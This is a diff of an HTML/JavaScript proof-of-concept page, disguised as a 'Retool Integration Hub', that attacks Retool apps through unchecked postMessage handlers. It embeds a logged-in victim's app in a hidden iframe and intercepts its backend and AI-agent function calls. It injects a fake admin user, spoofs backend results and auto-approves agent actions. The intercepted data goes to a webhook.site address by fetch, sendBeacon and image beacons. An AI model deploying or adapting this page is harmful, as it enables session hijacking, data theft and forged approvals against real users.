@@ -9,213 +9,199 @@
   body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; color: #1e293b; }
   .topbar { background: #1e293b; color: #fff; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; font-size: 14px; }
   .topbar .logo { font-weight: 700; font-size: 16px; }
-  .topbar .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
-  .topbar .dot.green { background: #4ade80; }
-  .topbar .dot.yellow { background: #fbbf24; animation: pulse 1s infinite; }
-  .topbar .dot.red { background: #ef4444; }
+  .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+  .dot.g { background: #4ade80; } .dot.y { background: #fbbf24; animation: pulse 1s infinite; } .dot.r { background: #ef4444; }
   @keyframes pulse { 50% { opacity: 0.5; } }
-  .container { max-width: 750px; margin: 30px auto; padding: 0 20px; }
+  .ctr { max-width: 750px; margin: 30px auto; padding: 0 20px; }
   .card { background: #fff; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; overflow: hidden; margin-bottom: 16px; }
-  .card-header { padding: 14px 20px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px; }
-  .card-body { padding: 16px 20px; }
+  .ch { padding: 14px 20px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px; }
+  .cb { padding: 16px 20px; }
   .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #f1f5f9; font-size: 13px; }
-  .row .l { color: #64748b; }
-  .row .v { font-weight: 500; font-family: monospace; font-size: 12px; }
+  .row .l { color: #64748b; } .row .v { font-weight: 500; font-family: monospace; font-size: 12px; }
   .badge { padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }
-  .badge.g { background: #dcfce7; color: #16a34a; }
-  .badge.y { background: #fef3c7; color: #d97706; }
-  .badge.r { background: #fef2f2; color: #dc2626; }
-  .btn { padding: 10px 22px; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; border: none; text-decoration: none; display: inline-block; }
-  .btn-blue { background: #3b82f6; color: #fff; }
-  .btn-blue:hover { background: #2563eb; }
-  .btn-red { background: #ef4444; color: #fff; }
-  .btn-red:hover { background: #dc2626; }
+  .badge.g { background: #dcfce7; color: #16a34a; } .badge.y { background: #fef3c7; color: #d97706; } .badge.r { background: #fef2f2; color: #dc2626; }
+  .btn { padding: 10px 22px; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; border: none; }
+  .btn-b { background: #3b82f6; color: #fff; } .btn-r { background: #ef4444; color: #fff; } .btn-g { background: #16a34a; color: #fff; }
   .hidden { display: none !important; }
-  .log-box { background: #1e293b; color: #e2e8f0; padding: 10px 14px; border-radius: 8px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 11px; line-height: 1.7; max-height: 280px; overflow-y: auto; }
-  .log-box .L1 { color: #fbbf24; } /* intercept */
-  .log-box .L2 { color: #f87171; } /* inject  */
-  .log-box .L3 { color: #4ade80; } /* exfil   */
-  .log-box .L4 { color: #94a3b8; } /* info    */
-  .log-box .L5 { color: #ef4444; } /* error   */
-  .stat { text-align: center; padding: 8px; }
-  .stat .n { font-size: 28px; font-weight: 700; }
-  .stat .t { font-size: 11px; color: #64748b; text-transform: uppercase; }
+  .log { background: #1e293b; color: #e2e8f0; padding: 10px 14px; border-radius: 8px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 11px; line-height: 1.7; max-height: 300px; overflow-y: auto; }
+  .log .i { color: #fbbf24; } .log .j { color: #f87171; } .log .x { color: #4ade80; } .log .n { color: #94a3b8; } .log .e { color: #ef4444; }
   .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+  .stat { text-align: center; padding: 10px; } .stat .n { font-size: 32px; font-weight: 700; } .stat .t { font-size: 11px; color: #64748b; text-transform: uppercase; }
+  input[type=text] { width: 100%; padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: monospace; font-size: 13px; }
+  .err { background: #fef2f2; border: 1px solid #fecaca; padding: 10px 14px; border-radius: 6px; font-size: 12px; color: #991b1b; margin-top: 8px; }
+  .ok { background: #f0fdf4; border: 1px solid #bbf7d0; padding: 10px 14px; border-radius: 6px; font-size: 12px; color: #16a34a; margin-top: 8px; }
 </style>
 </head>
 <body>
-
 <div class="topbar">
   <span class="logo">Retool Integration Hub</span>
-  <span><span class="dot yellow" id="topDot"></span> <span id="topLabel" style="font-size:13px;">Initializing...</span></span>
+  <span><span class="dot y" id="topDot"></span> <span id="topLabel" style="font-size:13px;">Loading...</span></span>
 </div>
 
-<div class="container">
+<div class="ctr">
   <!-- STATS -->
   <div class="stats">
-    <div class="card stat"><div class="n" id="cntIntercept">0</div><div class="t">Intercepted</div></div>
-    <div class="card stat"><div class="n" id="cntInject">0</div><div class="t">Injected</div></div>
-    <div class="card stat"><div class="n" id="cntExfil">0</div><div class="t">Exfiltrated</div></div>
+    <div class="card stat"><div class="n" id="cI">0</div><div class="t">Intercepted</div></div>
+    <div class="card stat"><div class="n" id="cJ">0</div><div class="t">Injected</div></div>
+    <div class="card stat"><div class="n" id="cX">0</div><div class="t">Exfiltrated</div></div>
   </div>
 
-  <!-- STATUS -->
+  <!-- CONFIG -->
   <div class="card">
-    <div class="card-header">Session Verification — Retool Connect</div>
-    <div class="card-body">
-      <div class="row"><span class="l">Target</span><span class="v" id="elTarget">—</span></div>
-      <div class="row"><span class="l">Webhook</span><span class="v" id="elWebhook">—</span></div>
-      <div class="row"><span class="l">Status</span><span id="elStatus"></span></div>
-      <div id="elErrMsg" class="hidden" style="margin-top:10px;padding:10px;background:#fef2f2;border:1px solid #fecaca;border-radius:6px;font-size:12px;color:#991b1b;"></div>
+    <div class="ch">Configuration</div>
+    <div class="cb">
+      <div style="margin-bottom:10px;">
+        <label style="font-size:12px;font-weight:600;">Target (retool sandbox URL)</label>
+        <input type="text" id="inpUrl" value="https://jonjos11.retool.com">
+        <div style="font-size:10px;color:#94a3b8;margin-top:2px;">
+          Use the sandbox/preview URL: /sandbox/ID/agent-vite or /_/rr/app/ID
+        </div>
+      </div>
+      <div style="margin-bottom:10px;">
+        <label style="font-size:12px;font-weight:600;">Webhook</label>
+        <input type="text" id="inpWh" value="https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be">
+      </div>
+      <div id="elStatus"></div>
+      <div id="elErr" class="err hidden"></div>
+      <div id="elOk" class="ok hidden"></div>
+      <div style="margin-top:12px; display:flex; gap:8px;">
+        <span class="btn btn-b" id="btnGo">Load Target</span>
+        <span class="btn btn-r" id="btnRe">Reload</span>
+        <span class="btn btn-g" id="btnTest">Test Webhook</span>
+      </div>
     </div>
   </div>
 
   <!-- LOG -->
   <div class="card">
-    <div class="card-header">postMessage Intercept Log <span style="font-size:11px;color:#94a3b8;margin-left:auto;" id="elLogCount">0 events</span></div>
-    <div class="card-body">
-      <div class="log-box" id="logBox"></div>
-    </div>
-  </div>
-
-  <!-- CONTROLS -->
-  <div style="display:flex;gap:8px;">
-    <span class="btn btn-red" id="btnReload">Reload Attack</span>
-    <span class="btn btn-blue" id="btnPopup">Open as Popup Instead</span>
+    <div class="ch">Intercept Log <span style="font-size:11px;color:#94a3b8;margin-left:auto;" id="elLogCnt">0 events</span></div>
+    <div class="cb"><div class="log" id="logBox"></div></div>
   </div>
 </div>
 
-<!-- Hidden iframe for the victim's retool app -->
 <iframe id="f" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
-
-<!-- Hidden iframe for form-based exfiltration fallback -->
-<iframe name="exfilFrame" style="display:none;" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+<iframe name="xf" style="display:none;"></iframe>
 
 <script>
 (function() {
   'use strict';
 
-  // ============================================================
-  // CONFIGURATION
-  // ============================================================
-  var CFG = {
-    // The retool sandbox URL to embed — victim must be logged in here
-    targetUrl: 'https://jonjos11.retool.com',
-
-    // Webhook to receive exfiltrated data
-    webhook: 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be',
-
-    // Fake user to inject into retool
-    fakeUser: {
-      id: 0,
-      email: 'attacker@evil.com',
-      firstName: 'Hacked',
-      lastName: 'Admin',
-      fullName: 'Hacked Admin',
-      profilePhotoUrl: null,
-      groups: [{ id: 1, name: 'admin' }, { id: 2, name: 'superuser' }],
-      metadata: { role: 'superadmin', _poc: true },
-      sid: 'inj-' + Date.now(),
-      externalIdentifier: null,
-      locale: 'en'
-    },
-
-    autoInject: true,
-    autoSpoof: true
-  };
-
-  // ============================================================
-  // DOM REFS
-  // ============================================================
-  var F = document.getElementById('f');
-  var LOGBOX = document.getElementById('logBox');
   var cntI = 0, cntJ = 0, cntX = 0;
-
-  // ============================================================
-  // EXFILTRATION — Multiple methods for reliability
-  // ============================================================
-  function exfil(payload) {
-    var json = JSON.stringify(payload);
-    var W = CFG.webhook;
-
-    // Method 1: Image beacon — works everywhere, no CORS issues
-    // webhook.site accepts GET requests, data goes in query string
-    var enc = encodeURIComponent(json);
-    var url = W + '?d=' + enc;
-    // Truncate if too long for URL (~2000 chars safe limit)
-    if (url.length > 1900) {
-      url = W + '?d=' + encodeURIComponent(json.slice(0, 800));
-    }
-    var img = new Image();
-    img.src = url;
-    cntX++;
-    addLog('EXFIL #' + cntX + ': Beacon sent → webhook', 'L3');
-    console.log('[EXFIL]', payload.event || 'data', '→', W);
-
-    // Method 2: sendBeacon — reliable for POST
-    if (navigator.sendBeacon) {
-      try {
-        var blob = new Blob([json], { type: 'text/plain' });
-        navigator.sendBeacon(W, blob);
-      } catch(e) {}
-    }
-
-    // Method 3: fetch (no-cors, simple content-type to avoid preflight)
-    try {
-      fetch(W, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'text/plain' },
-        body: json
-      }).catch(function(){});
-    } catch(e) {}
-  }
+  var W = document.getElementById('inpWh').value;
+  var T = document.getElementById('inpUrl').value;
+  var F = document.getElementById('f');
+  var LOG = document.getElementById('logBox');
 
   // ============================================================
   // LOGGING
   // ============================================================
-  function addLog(msg, cls) {
+  function L(msg, cls) {
     var t = new Date().toLocaleTimeString('en-US', { hour12: false });
-    var div = document.createElement('div');
-    div.className = (cls || 'L4');
-    div.textContent = '[' + t + '] ' + msg;
-    LOGBOX.appendChild(div);
-    LOGBOX.scrollTop = LOGBOX.scrollHeight;
-    console.log('[PoC]', msg);
+    var d = document.createElement('div');
+    d.className = cls || 'n';
+    d.textContent = '[' + t + '] ' + msg;
+    LOG.appendChild(d);
+    LOG.scrollTop = LOG.scrollHeight;
+    console.log(msg);
   }
 
-  function updateUI() {
-    document.getElementById('cntIntercept').textContent = cntI;
-    document.getElementById('cntInject').textContent = cntJ;
-    document.getElementById('cntExfil').textContent = cntX;
-    document.getElementById('elLogCount').textContent = cntI + ' events';
-    document.getElementById('topDot').className = cntI > 0 ? 'dot green' : (F.src ? 'dot yellow' : 'dot red');
-    document.getElementById('topLabel').textContent = cntI > 0 ? cntI + ' messages intercepted' : (F.src ? 'Waiting for messages...' : 'Not loaded');
+  function U() {
+    document.getElementById('cI').textContent = cntI;
+    document.getElementById('cJ').textContent = cntJ;
+    document.getElementById('cX').textContent = cntX;
+    document.getElementById('elLogCnt').textContent = cntI + ' events';
+    document.getElementById('topDot').className = cntI > 0 ? 'dot g' : (F.src ? 'dot y' : 'dot r');
+    document.getElementById('topLabel').textContent = cntI > 0 ? cntI + ' messages intercepted' : (F.src ? 'Waiting...' : 'Not loaded');
+  }
+
+  // ============================================================
+  // EXFILTRATION (3 methods — all avoid CORS preflight)
+  // ============================================================
+  function X(payload) {
+    var json = JSON.stringify(payload);
+    var wh = document.getElementById('inpWh').value;
+
+    // Method 1: Regular fetch (webhook.site supports CORS)
+    try {
+      fetch(wh, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: json
+      }).then(function(r) {
+        if (r.ok) L('EXFIL: fetch OK (' + r.status + ')', 'x');
+        else L('EXFIL: fetch FAIL (' + r.status + ')', 'e');
+      }).catch(function(e) {
+        L('EXFIL: fetch error: ' + e.message, 'e');
+      });
+    } catch(e) {
+      L('EXFIL: fetch threw: ' + e.message, 'e');
+    }
+
+    // Method 2: sendBeacon
+    if (navigator.sendBeacon) {
+      try {
+        var blob = new Blob([json], { type: 'text/plain' });
+        var ok = navigator.sendBeacon(wh, blob);
+        L('EXFIL: sendBeacon ' + (ok ? 'queued' : 'failed'), ok ? 'x' : 'e');
+      } catch(e) {
+        L('EXFIL: sendBeacon error: ' + e.message, 'e');
+      }
+    }
+
+    // Method 3: Image (appended to DOM for reliability)
+    try {
+      var q = '?d=' + encodeURIComponent(json.slice(0, 800));
+      var img = document.createElement('img');
+      img.style.display = 'none';
+      img.src = wh + q;
+      document.body.appendChild(img);
+      setTimeout(function() { document.body.removeChild(img); }, 1000);
+      L('EXFIL: image beacon sent', 'x');
+    } catch(e) {
+      L('EXFIL: image error: ' + e.message, 'e');
+    }
+
+    cntX++;
+    U();
   }
 
   // ============================================================
   // INJECTIONS
   // ============================================================
   function injectUser() {
-    F.contentWindow.postMessage({ type: 'RETOOL_CURRENT_USER', data: CFG.fakeUser }, '*');
+    var fakeUser = {
+      id: 0, email: 'attacker@evil.com', firstName: 'Hacked', lastName: 'Admin',
+      fullName: 'Hacked Admin', profilePhotoUrl: null,
+      groups: [{ id: 1, name: 'admin' }, { id: 2, name: 'superuser' }],
+      metadata: { role: 'superadmin', _poc: true },
+      sid: 'inj-' + Date.now(), externalIdentifier: null, locale: 'en'
+    };
+
+    try {
+      F.contentWindow.postMessage({ type: 'RETOOL_CURRENT_USER', data: fakeUser }, '*');
+    } catch(e) {}
+
     cntJ++;
-    addLog('INJECT: Fake RETOOL_CURRENT_USER → ' + CFG.fakeUser.email + ' (admin)', 'L2');
-    exfil({ event: 'inject_user', injected: CFG.fakeUser.email, groups: CFG.fakeUser.groups, time: new Date().toISOString() });
-    updateUI();
+    L('INJECT: Fake RETOOL_CURRENT_USER → ' + fakeUser.email + ' (admin groups)', 'j');
+    X({ event: 'inject_user', injected: fakeUser.email, groups: fakeUser.groups, time: new Date().toISOString() });
+    U();
   }
 
   function spoofResult(rid, fname) {
-    F.contentWindow.postMessage({
-      type: 'RETOOL_BACKEND_RESULT',
-      requestId: rid,
-      data: { _spoofed: true, _attacker: 'postMessage * exploit', timestamp: new Date().toISOString() }
-    }, '*');
+    try {
+      F.contentWindow.postMessage({
+        type: 'RETOOL_BACKEND_RESULT', requestId: rid,
+        data: { _spoofed: true, _attacker: 'postMessage wildcard exploit', timestamp: new Date().toISOString() }
+      }, '*');
+    } catch(e) {}
+
     cntJ++;
-    addLog('INJECT: Spoofed RETOOL_BACKEND_RESULT → ' + fname, 'L2');
-    updateUI();
+    L('INJECT: Spoofed RETOOL_BACKEND_RESULT → ' + fname, 'j');
+    U();
   }
 
   // ============================================================
-  // INTERCEPTION ENGINE
+  // INTERCEPTION
   // ============================================================
   window.addEventListener('message', function(e) {
     if (e.source !== F.contentWindow) return;
@@ -223,196 +209,148 @@
     if (!d || typeof d !== 'object' || !d.type) return;
 
     cntI++;
-    updateUI();
+    U();
 
-    // --- RETOOL_CURRENT_USER_REQUEST (retol.js:7051 → sent to '*') ---
     if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
-      addLog('INTERCEPT: RETOOL_CURRENT_USER_REQUEST — app wants user identity', 'L1');
-      addLog('  retol.js:7051 → parent.postMessage({...}, "*")', 'L4');
-
-      exfil({
-        event: 'intercept',
-        type: 'RETOOL_CURRENT_USER_REQUEST',
-        origin: e.origin,
-        time: new Date().toISOString(),
-        pageUrl: window.location.href,
-        note: 'Retool app requesting current user via wildcard *'
-      });
-
-      if (CFG.autoInject) setTimeout(injectUser, 200);
+      L('INTERCEPT: RETOOL_CURRENT_USER_REQUEST (retol.js:7051 → "*")', 'i');
+      X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', origin: e.origin, time: new Date().toISOString(), note: 'App requesting user identity via wildcard' });
+      setTimeout(injectUser, 200);
     }
-
-    // --- RETOOL_BACKEND_FUNCTION (retol.js:6833,6979 → sent to '*') ---
     else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
-      addLog('INTERCEPT: RETOOL_BACKEND_FUNCTION', 'L1');
-      addLog('  functionName: ' + d.functionName, 'L1');
-      addLog('  params: ' + JSON.stringify(d.params || {}).slice(0, 250), 'L1');
-      addLog('  requestId: ' + d.requestId, 'L4');
-      addLog('  retol.js:6833 → parent.postMessage({...}, "*")', 'L4');
-
-      exfil({
-        event: 'intercept',
-        type: 'RETOOL_BACKEND_FUNCTION',
-        functionName: d.functionName,
-        params: d.params,
-        requestId: d.requestId,
-        origin: e.origin,
-        time: new Date().toISOString(),
-        note: 'Backend function leaked via wildcard postMessage'
-      });
-
-      if (CFG.autoSpoof) setTimeout(function() { spoofResult(d.requestId, d.functionName); }, 200);
+      L('INTERCEPT: RETOOL_BACKEND_FUNCTION — ' + d.functionName, 'i');
+      L('  params: ' + JSON.stringify(d.params || {}).slice(0, 250), 'n');
+      L('  requestId: ' + d.requestId, 'n');
+      X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString(), note: 'Backend function call leaked' });
+      setTimeout(function() { spoofResult(d.requestId, d.functionName); }, 200);
     }
-
-    // --- RETOOL_BACKEND_AGENT_FUNCTION (retol.js:703) ---
     else if (d.type === 'RETOOL_BACKEND_AGENT_FUNCTION') {
-      addLog('INTERCEPT: RETOOL_BACKEND_AGENT_FUNCTION — ' + d.functionName, 'L1');
-      addLog('  params: ' + JSON.stringify(d.params || {}).slice(0, 250), 'L1');
-
-      exfil({
-        event: 'intercept',
-        type: 'RETOOL_BACKEND_AGENT_FUNCTION',
-        functionName: d.functionName,
-        params: d.params,
-        requestId: d.requestId,
-        time: new Date().toISOString(),
-        note: 'AI Agent function call intercepted'
-      });
-
-      if (CFG.autoSpoof) {
-        setTimeout(function() {
-          F.contentWindow.postMessage({ type: 'RETOOL_BACKEND_APPROVAL', requestId: d.requestId, approved: true }, '*');
-          cntJ++;
-          addLog('INJECT: Approved agent function ' + d.requestId, 'L2');
-          updateUI();
-        }, 200);
-      }
+      L('INTERCEPT: RETOOL_BACKEND_AGENT_FUNCTION — ' + d.functionName, 'i');
+      X({ event: 'intercept', type: 'RETOOL_BACKEND_AGENT_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, time: new Date().toISOString(), note: 'AI agent function intercepted' });
+      setTimeout(function() {
+        try { F.contentWindow.postMessage({ type: 'RETOOL_BACKEND_APPROVAL', requestId: d.requestId, approved: true }, '*'); } catch(e) {}
+        cntJ++; L('INJECT: Approved agent function ' + d.requestId, 'j'); U();
+      }, 200);
     }
-
-    // --- Any other RETOOL_ message ---
     else if (d.type.indexOf('RETOOL_') === 0) {
-      addLog('INTERCEPT: ' + d.type, 'L1');
-      exfil({
-        event: 'intercept',
-        type: d.type,
-        data: d,
-        time: new Date().toISOString(),
-        note: 'Additional retool postMessage intercepted'
-      });
+      L('INTERCEPT: ' + d.type, 'i');
+      X({ event: 'intercept', type: d.type, data: d, time: new Date().toISOString() });
     }
 
-    updateUI();
+    U();
   });
 
   // ============================================================
-  // LOAD THE RETOOL IFRAME
+  // LOAD TARGET
   // ============================================================
-  function loadTarget(url) {
-    CFG.targetUrl = url || CFG.targetUrl;
-    F.src = CFG.targetUrl;
-    document.getElementById('elTarget').textContent = CFG.targetUrl;
-    document.getElementById('elWebhook').textContent = CFG.webhook;
-    document.getElementById('elStatus').innerHTML = '<span class="badge y">Loading...</span>';
+  function loadTarget() {
+    T = document.getElementById('inpUrl').value.trim();
+    W = document.getElementById('inpWh').value.trim();
 
-    addLog('LOAD: Embedding retool iframe → ' + CFG.targetUrl, 'L4');
-    addLog('WEBHOOK: ' + CFG.webhook, 'L4');
-    addLog('WAIT: Listening for postMessages sent to "*"...', 'L4');
-    addLog('', 'L4');
-    addLog('VULNERABLE HANDLERS (no origin check):', 'L4');
-    addLog('  • RETOOL_CURRENT_USER    → retol.js:7043', 'L4');
-    addLog('  • RETOOL_BACKEND_RESULT  → retol.js:6800,6949', 'L4');
-    addLog('  • RETOOL_AUTH_COMPLETE   → retol.js:7751', 'L4');
-    addLog('WILDCARD postMessage ("*"):', 'L4');
-    addLog('  • RETOOL_CURRENT_USER_REQUEST → retol.js:7051', 'L4');
-    addLog('  • RETOOL_BACKEND_FUNCTION     → retol.js:6833,6979', 'L4');
+    if (!T) { L('ERROR: No target URL', 'e'); return; }
 
-    updateUI();
+    F.src = T;
+    document.getElementById('elStatus').innerHTML = '<span class="badge y">Loading iframe...</span>';
+    document.getElementById('elErr').classList.add('hidden');
+    document.getElementById('elOk').classList.add('hidden');
 
-    // Send initial heartbeat to verify webhook works
-    exfil({
-      event: 'page_loaded',
-      targetUrl: CFG.targetUrl,
-      pageUrl: window.location.href,
-      referrer: document.referrer,
-      userAgent: navigator.userAgent,
-      time: new Date().toISOString()
-    });
-    addLog('HEARTBEAT: Test beacon sent to webhook — check webhook.site', 'L3');
+    L('LOAD: Embedding → ' + T, 'n');
+    L('WEBHOOK: ' + W, 'n');
+    L('', 'n');
+    L('VULNERABLE HANDLERS (no origin check):', 'n');
+    L('  RETOOL_CURRENT_USER       → retol.js:7043', 'n');
+    L('  RETOOL_BACKEND_RESULT     → retol.js:6800', 'n');
+    L('  RETOOL_AUTH_COMPLETE      → retol.js:7751', 'n');
+    L('WILDCARD postMessage targets ("*"):', 'n');
+    L('  RETOOL_CURRENT_USER_REQUEST → retol.js:7051', 'n');
+    L('  RETOOL_BACKEND_FUNCTION     → retol.js:6833', 'n');
 
-    // Check if iframe loaded
+    U();
+
+    // Send heartbeat
+    L('', 'n');
+    L('Sending heartbeat to webhook...', 'x');
+    X({ event: 'heartbeat', targetUrl: T, pageUrl: window.location.href, referrer: document.referrer, userAgent: navigator.userAgent, time: new Date().toISOString() });
+
     F.onload = function() {
-      document.getElementById('elStatus').innerHTML = '<span class="badge g">Iframe Loaded</span>';
-      addLog('IFRAME: Loaded successfully — waiting for retool postMessages...', 'L4');
-      updateUI();
+      document.getElementById('elStatus').innerHTML = '<span class="badge g">Iframe loaded</span>';
+      document.getElementById('elOk').classList.remove('hidden');
+      document.getElementById('elOk').textContent = 'Iframe loaded! Waiting for retool postMessages. Check webhook.site — the heartbeat should have arrived by now.';
+      L('IFRAME: Loaded. Waiting for postMessages...', 'n');
+      U();
     };
 
     F.onerror = function() {
-      document.getElementById('elStatus').innerHTML = '<span class="badge r">Blocked</span>';
-      document.getElementById('elErrMsg').classList.remove('hidden');
-      document.getElementById('elErrMsg').textContent =
-        'Iframe failed to load. The target may block embedding via X-Frame-Options or CSP frame-ancestors. Try "Open as Popup" instead.';
-      addLog('ERROR: Iframe blocked — target may refuse embedding (X-Frame-Options)', 'L5');
-      updateUI();
+      document.getElementById('elStatus').innerHTML = '<span class="badge r">Blocked (X-Frame-Options?)</span>';
+      document.getElementById('elErr').classList.remove('hidden');
+      document.getElementById('elErr').textContent = 'Iframe blocked. Target may refuse embedding. Try the sandbox URL (/sandbox/ID/agent-vite) or use window.open as fallback.';
+      L('ERROR: Iframe refused to load (X-Frame-Options / CSP)', 'e');
+      U();
     };
   }
 
   // ============================================================
-  // POPUP FALLBACK — open retool in a popup window
+  // TEST WEBHOOK
   // ============================================================
-  function openAsPopup() {
-    var w = window.open(CFG.targetUrl, 'retoolWin', 'width=1200,height=800');
-    if (!w) {
-      addLog('ERROR: Popup blocked by browser', 'L5');
-      return;
-    }
-    addLog('POPUP: Opened retool in new window — can send postMessages', 'L4');
+  function testWebhook() {
+    var wh = document.getElementById('inpWh').value;
+    L('TEST: Sending test beacon to ' + wh, 'x');
 
-    // When the popup loads, start injecting
-    setTimeout(function() {
-      try {
-        w.postMessage({ type: 'RETOOL_CURRENT_USER', data: CFG.fakeUser }, '*');
-        addLog('INJECT: Sent fake user to popup window', 'L2');
-        cntJ++;
-        updateUI();
-      } catch(e) {
-        addLog('ERROR: Cannot postMessage to popup: ' + e.message, 'L5');
+    // Try fetch first (not no-cors — webhook.site supports CORS)
+    fetch(wh, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ event: 'test_beacon', time: new Date().toISOString(), source: 'manual_test' })
+    }).then(function(r) {
+      if (r.ok) {
+        L('TEST: fetch SUCCESS (' + r.status + ') — webhook is reachable!', 'x');
+        document.getElementById('elOk').classList.remove('hidden');
+        document.getElementById('elOk').textContent = 'Test succeeded! Webhook is receiving data.';
+      } else {
+        L('TEST: fetch returned ' + r.status, 'e');
       }
-    }, 3000);
+    }).catch(function(e) {
+      L('TEST: fetch FAILED — ' + e.message, 'e');
+      L('TEST: Trying image beacon fallback...', 'n');
 
-    // Also try to intercept messages from the popup
-    window.addEventListener('message', function(e) {
-      if (e.source !== w) return;
-      var d = e.data;
-      if (!d || typeof d !== 'object' || !d.type) return;
-      cntI++;
-      addLog('POPUP-MSG: ' + d.type + ' from retool popup', 'L1');
-      exfil({ event: 'popup_intercept', type: d.type, data: d, time: new Date().toISOString() });
-      updateUI();
+      // Image fallback
+      var img = document.createElement('img');
+      img.style.display = 'none';
+      img.src = wh + '?test=' + Date.now();
+      document.body.appendChild(img);
+      setTimeout(function() { document.body.removeChild(img); }, 500);
+      L('TEST: Image beacon sent. Check webhook.site for GET request.', 'x');
     });
+
+    // Also try sendBeacon
+    if (navigator.sendBeacon) {
+      var blob = new Blob([JSON.stringify({ event: 'test_beacon', time: new Date().toISOString() })], { type: 'text/plain' });
+      navigator.sendBeacon(wh, blob);
+      L('TEST: sendBeacon queued', 'x');
+    }
   }
 
   // ============================================================
-  // UI BINDINGS
+  // BUTTONS
   // ============================================================
-  document.getElementById('btnReload').addEventListener('click', function() {
-    cntI = 0; cntJ = 0; cntX = 0;
-    LOGBOX.innerHTML = '';
+  document.getElementById('btnGo').addEventListener('click', function() {
+    cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = '';
+    loadTarget();
+  });
+
+  document.getElementById('btnRe').addEventListener('click', function() {
+    cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = '';
     F.src = '';
-    setTimeout(function() { loadTarget(); }, 300);
+    setTimeout(loadTarget, 300);
   });
 
-  document.getElementById('btnPopup').addEventListener('click', function() {
-    openAsPopup();
-    exfil({ event: 'popup_opened', targetUrl: CFG.targetUrl, time: new Date().toISOString() });
-  });
+  document.getElementById('btnTest').addEventListener('click', testWebhook);
 
   // ============================================================
-  // AUTO-START
+  // INIT
   // ============================================================
-  document.getElementById('elTarget').textContent = CFG.targetUrl;
-  document.getElementById('elWebhook').textContent = CFG.webhook;
-  addLog('PoC ready — auto-loading retool target...', 'L4');
-  loadTarget();
+  L('PoC ready. Enter retool sandbox URL and click "Load Target"', 'n');
+  L('Or click "Test Webhook" first to verify connectivity.', 'n');
+  U();
 
 })();
 </script>
